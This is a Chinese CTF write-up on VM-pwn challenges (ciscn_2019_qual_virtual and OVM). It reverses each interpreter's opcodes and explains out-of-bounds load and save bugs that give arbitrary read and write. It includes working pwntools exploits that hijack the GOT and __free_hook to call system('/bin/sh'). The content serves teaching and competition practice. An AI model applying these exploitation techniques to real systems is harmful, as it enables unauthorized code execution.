前言
==

ctf比赛中的vm逆向不是指VMware或VirtualBox一类的虚拟机，而是一种解释执行系统或者模拟器，近几年出现的频率越来越高了，故总结一下vmpwn中常见的漏洞

ciscn\_2019\_qual\_virtual
==========================

程序保护
----

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-03aae925c9ba35083040892b59ee0b7ddd74bd90.png)  
发现没开pie和只开了Partial RELRO

程序分析
----

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-5eeaed9eb1fd8d1bc55aea520621ee215c123cf5.png)

程序开始先是定义了三个堆分别作为vm的stack text data段

### init\_seg

逆向出结构体后是这样

```php
struct segment_chunk
{
  char *segment;
  unsigned int size;
  int nop;  这个nop后面分析发现 是stack段中的值的个数
};
```

### 读入数据并且转移数据

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-ab4e40cd19ae92ca77b2237af7bac87f135dbec8.png)

#### 第一个红框

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8ea7410e09b9348a5ad1245d834ac249945339b3.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-dabe45734966cae3b643f093b6b3430b48f48c60.png)  
先将值存入ptr所在的堆块 然后在进入move\_func 以' '空格为区分切割存入最开始设置的text段

#### 第二个红框

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-2acf8c36c09749cff5320884d02caceb6827506f.png)

代码逻辑基本相同，是存放入stack段中

### vm\_func

这里逆出来功能点是下图这样

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-0eae5103b6f3d2659392530589d51304390eec9b.png)  
有两个关键的函数

#### take\_value

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-b8f4d33e8ee7f0691a161f22124559a4a7e8343e.png)

可以看出是把a1-&gt;segment中的指取出来给a2

#### set\_value

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-05d131376378c76c7957fa96a395297b0ee806f8.png)

与take\_value相反

#### 功能点

```php
func_pop(v3_data, a2_stack);
func_push(v3_data, a2_stack);
func_add(v3_data);
func_sub(v3_data);
func_x(v3_data);  乘法
func_division(v3_data); 除法
func_load(v3_data);
func_save(v3_data);
```

这里分析一下load和save 其他的可以参考分析得出

#### func\_load(v3\_data);

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-f2ba3163e3a11dc301b1382121012a8ae720caa6.png)  
这里是取出data段中的值为v2，然后把data\[0\]的值设置为data\[v2\]地址所存放的值

#### func\_save(v3\_data);

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-a3841bfcccec43e6603f26aae20a6ea3860e108f.png)

取两个参数，一个v2，一个v3 并且把data\[v2\]的值存放为v3

漏洞分析
----

这里关键点在于load和save这两个功能

load可以进行任意地址读，相当于可以读入data\[num\]的任何数据为data\[0\]

save可以进行任意地址写，由于v2和v3都是可控的，因此可以进行任意地址写

### 攻击思路

由于got表是可以写的，并且我们有任意地址写 因此我们可以通过之前的分析发现，data段的上方就是存放data段的指针

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-18107cfaafc07fe4edc69ae0abf1917cee68ccdf.png)  
因此我们可以通过save来把指针覆盖为got段的下方一点的位置，然后通过load去取出puts的地址 然后通过add或者sub的功能去增加偏移把puts去修改为system，由于最后有一个puts(s) 是我们可控的 因此就可以getshell

exp如下
-----

```php
#!/usr/bin/python3
from pwn import *
import random
import os
import sys
import time
from pwn import *
from ctypes import *

#--------------------setting context---------------------
context.clear(arch='amd64', os='linux', log_level='debug')

#context.terminal = ['tmux', 'splitw', '-h']
sla = lambda data, content: mx.sendlineafter(data,content)
sa = lambda data, content: mx.sendafter(data,content)
sl = lambda data: mx.sendline(data)
rl = lambda data: mx.recvuntil(data)
re = lambda data: mx.recv(data)
sa = lambda data, content: mx.sendafter(data,content)
inter = lambda: mx.interactive()
l64 = lambda:u64(mx.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
h64=lambda:u64(mx.recv(6).ljust(8,b'\x00'))
s=lambda data: mx.send(data)
log_addr=lambda data: log.success("--->"+hex(data))
p = lambda s: print('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))

def dbg():
    gdb.attach(mx)

#---------------------------------------------------------
# libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')
filename = "./ciscn_2019_qual_virtual"
mx = process(filename)
#mx = remote("0192d63fbe8f7e5f9ab5243c1c69490f.q619.dg06.ciihw.cn",43013)
elf = ELF(filename)
libc=elf.libc
#初始化完成---------------------------------------------------------\
dbg()
rl("Your program name:\n")
sl(b'/bin/sh\x00')
rl("Your instruction:\n")
payload=b'push push save push load push add push save'
sl(payload)
rl("Your stack data:\n")
content=b'4210896 -3 -21 -193680 -21'
sl(content)
inter()
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-5759a553e1d34f21666c7ca742bc73373c3e0a67.png)

OVM
===

程序保护
----

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-e50923fe9284f7fef8d854049502eeaeda360158.png)

程序分析
----

### main

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-668634f500f7f62e1ab401a803f3b7ca4ae2f43d.png)

这一部分重点就是给SP PC赋值，然后把code读入memory\[PC+i\]的位置，并且通过检测限制单个字节最大为0xff

### fetch

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-79465d02bb0201b190bc7d1c735d91352cbc10f9.png)

这里就是取出PC的值 传给memory 方便后面执行execute程序

### execute

```php
  v4 = (a1 & 0xF0000u) >> 16;
  v3 = (unsigned __int16)(a1 & 0xF00) >> 8;
  v2 = a1 & 0xF;
  result = HIBYTE(a1);
```

这里对传入的a1分别进行了几段的处理 处理后分别为v4 v3 v2 HIBYTE(a1);

#### add功能： 0x70

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-89f1dc9081bc2edb846b1228e51ea0d97f17e89b.png)

#### 异或功能：0xb0

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-1548b3abe64fe1c7e1f6ed7c889c88c33c801f48.png)

#### 右移操作：0xd0

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-7c377cc611cbbc5dfec9a1b37a462303a0d5dd2d.png)

#### 打印寄存器情况：0xff

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-70f41c684f4112922c62ecc494a5d5d1ebedf1ae.png)

#### 左移操作：0xc0

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-b5370da38bfbbf323a1024dc5aa3ab27e0f29235.png)

#### 位与操作：0x90

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-3e9bf683abf44efc0f2876473e5c6c6182079781.png)

#### 位或操作：0xa0

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-76bf2fd88924c78262b18905b8b805990eb755d0.png)

#### 减法操作：0x80

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-09f58100c680ba675f7d95a9e9703e8b499df42c.png)

#### save操作： 0x30

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-7124687c3c7a5451a54f64ea81e2df800cdc8139.png)

#### push操作:0x50

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-bcba42a92e56daec84f2a76ecc02ed8b5a9a38f0.png)

#### pop操作: 0x60

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-25141d66c3f5b86f741858079a58e475b685f983.png)

#### memory内存写入:0x40

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-1366019594c6851eaf494c1a8c20767c6a9a6695.png)

给reg\[v4\]赋值 0x10 0x20

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-d8daf275e45b8e680a313adc3c61998ae54fb660.png)

### 功能表一览

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-55a7e4106f261658d75137a0ba212df93c20002b.png)

漏洞分析
----

我们关注到

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-780f17a80d7d43b2db1f37d9f4592eb37bcc40db.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-972d8f7d702d66d1528a34a5673867c412a31d3e.png)

这两个地方 一个是可以把reg\[v2\]中的值作为memory的索引去读入到reg\[v4\]中，另一个是可以把reg\[v4\]的值读入到memory\[reg\[v2\]\]中，而这里的v2是我们可以控制的，因此就可能导致溢出写，摆在我们面前的目前有两个问题

1.如何去泄露libc的地址

2.程序在开了FULL RELRO的情况应该改写哪里

### 问题一

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-c034296e3ea6e8ce9acc2acd0585b8efc19cd2a8.png)  
可以看到memory 离got表的距离只有0x68换算一下也就是4\*26 我们可以通过

reg\[v4\] = memory\[reg\[v2\]\];这个控制reg\[v2\]为-26 来把got表中的值读入寄存器，这里还有个限制 就是 我们前面分析的赋值的时候限制了大小为0到0xff 因此不能直接赋负值，我们可以通过 寄存器相减来实现这个目标

```php
opcode(0x10,0,0,26)     #mov reg[0],26
opcode(0x80,2,1,0)      #reg[2]=reg[1]-reg[0]
```

这样子就实现了通过取负值取出got表的值，而由于got表中的地址是8字节，而我们的寄存器只存储4字节所以我们要存储在两个寄存器中 方便后续进行计算处理

```php
opcode(0x10,0,0,26)     #mov reg[0],26
opcode(0x80,2,1,0)      #reg[2]=reg[1]-reg[0]
opcode(0x30,4,0,2)      #mov reg[4],memory[reg[2]]
opcode(0x10,0,0,25)     #mov reg[0],25
opcode(0x80,2,1,0)      #reg[2]=reg[1]-reg[0]
opcode(0x30,5,0,2)      #mov reg[5],memory[reg[2]]      
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-e319457b4583e0676bb5837883fa729ea5be3392.png)

然后后续我们有个打印所有寄存器的功能 就可以把libc的地址泄露出来

### 问题二

got表是不可以写的，因此我们只能考虑改别的 观察到

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-9aac12bb590161f71c0120b7dcfc10b3d6fa472c.png)  
这里有个read读入到comment中存放的地址(这个可以通过调试得出来)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-dfe256f845dcb902117cfd8ab47f904cefd898ba.png)

这是原地址，而comment存放地址的位置离memory非常的近，因此我们可以通过

memory\[reg\[v2\]\] = reg\[v4\]; 这个去把memory上面的comment覆盖为寄存器的值，和之前读取一样 需要两个4字节 修改后 就可以实现任意地址写了，由于后面有一次free 自然想到改free\_hook

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-b30f98f624d4bdf411d3e68b684cf8793a1f747f.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-8f687f52de9071ce0ade25c7aa45f75e66da5747.png)

可以看到差距0x10a8我们可以通过寄存器之间加减变化得到，因为直接给寄存器传值收到了0-0xff的限制，所以要达到这个数值的话有两种思路：

1.是通过reg\[13\]或者reg\[15\]作为计算依据 这个是没有受到限制可以直接传入的

2.就是通过多次累加 或者 累减 之类的方式

### 思路总结

通过读取的功能去把got表中的值读入寄存器中 并且泄露出来，然后通过加减变化stderr的值为\_\_free\_hook-8的值 然后 通过 memory\[reg\[v2\]\] = reg\[v4\]; 传入覆盖comment的值 然后 修改 free\_hook的值为system free\_hook-8的值为/bin/sh\\x00 就可以getshell

动态调试
----

### 读取地址：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-63666154ff2139c811af065b372d14e1b910dffa.png)

### 修改stderr为free\_hook-8

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-c32c7be68e1b77baa81314070e7432802cda866a.png)

### 修改comment为free\_hook-8

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-6da9083dcec7873d12d7f2e879a68633558a8f25.png)

### 修改为system

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-c342975ae16b998e47176454913c75661f54d920.png)

### getshell

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-681ae72c944527e283ca42dfe64bc9a243231d37.png)

exp
---

```php
#!/usr/bin/python3
from pwn import *
import random
import os
import sys
import time
from pwn import *
from ctypes import *

#--------------------setting context---------------------
context.clear(arch='amd64', os='linux', log_level='debug')

#context.terminal = ['tmux', 'splitw', '-h']
sla = lambda data, content: mx.sendlineafter(data,content)
sa = lambda data, content: mx.sendafter(data,content)
sl = lambda data: mx.sendline(data)
rl = lambda data: mx.recvuntil(data)
re = lambda data: mx.recv(data)
sa = lambda data, content: mx.sendafter(data,content)
inter = lambda: mx.interactive()
l64 = lambda:u64(mx.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
h64=lambda:u64(mx.recv(6).ljust(8,b'\x00'))
s=lambda data: mx.send(data)
log_addr=lambda data: log.success("--->"+hex(data))
p = lambda s: print('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))

def dbg():
    gdb.attach(mx)

#---------------------------------------------------------
# libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')
filename = "./OVM"
mx = process(filename)
#mx = remote("0192d63fbe8f7e5f9ab5243c1c69490f.q619.dg06.ciihw.cn",43013)
elf = ELF(filename)
libc=elf.libc
#初始化完成---------------------------------------------------------\
def opcode(op,high,medium,low):
    content=(op<<24)+(high<<16)+(medium<<8)+(low)
    sl(str(content))
dbg()
rl("PCPC: ")
sl(str(0x1111))
rl("SP: ")
sl(str(0x10a0))
rl("CODE SIZE: ")
sl(str(14))
rl("CODE: ")
#0FB7
opcode(0x10, 0, 0, 26)
opcode(0x80, 2, 1, 0)
opcode(0x30, 4, 0, 2)
opcode(0x10, 0, 0, 25)
opcode(0x80, 2, 1, 0)
opcode(0x30, 5, 0, 2)
opcode(0x70, 4, 4, 13)
#--------------------------
opcode(0x10, 0, 0, 8)
opcode(0x80, 2, 1, 0)
#--------------------------
opcode(0x40, 4, 0, 2)
opcode(0x10, 0, 0, 7)
opcode(0x80, 2, 1, 0)
#--------------------------
opcode(0x40, 5, 0, 2)
opcode(0xff, 0, 0, 0)
rl("R4: ")
libc_addr1=int(mx.recv(8),16)
rl("R5: ")
libc_addr2=int(mx.recv(4),16)
print(hex(libc_addr1))
print(hex(libc_addr2))
libc_addr = (libc_addr2 << 32) + libc_addr1
print(hex(libc_addr))
#0F48=m
system=libc_addr-0x39e4a0
rl("HOW DO YOU FEEL AT OVM?")
s(b'/bin/sh\x00'+p64(system))
inter()
```

总结
==

像上面这种VMpwn的题目,关键功能点就是分配了栈 text data段 然后模拟pop push mov lea等功能,这种更多的是难在逆向 把功能点都一个个弄清楚之后 找到漏洞其实并不难，无非就是数据越界等常见漏洞，而我们通过两道题目发现 其实很多功能点是在我们的漏洞利用中每起到作用中，因此比赛的时候遇到类似这种题 就只需要重点去看涉及到栈 data等的指令 pop push lea类似的这种 便于快速锁定漏洞 拿到flag.